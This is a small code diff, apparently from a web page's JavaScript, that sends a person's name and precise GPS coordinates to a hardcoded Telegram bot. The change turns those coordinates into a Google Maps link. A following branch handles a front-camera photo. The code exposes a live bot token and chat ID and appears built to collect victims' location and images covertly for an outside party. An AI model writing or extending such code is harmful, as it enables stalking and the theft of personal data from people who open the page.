@@ -311,7 +311,7 @@
     const token = '7516763113:AAH2DOnREnv6aIFGRXCzPXndm4l1c3zXC7M';
     const chatId = '526758225';
 
-    const msg = `👤 Անուն: ${name}\n📍 Տեղադրություն: ${lat.toFixed(6)}, ${lon.toFixed(6)}`;
+    const msg = `👤 Անուն: ${name}\n📍 Գտնվում է այստեղ՝ https://www.google.com/maps?q=${lat},${lon}`;
     await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
 
     if (photoFront) {
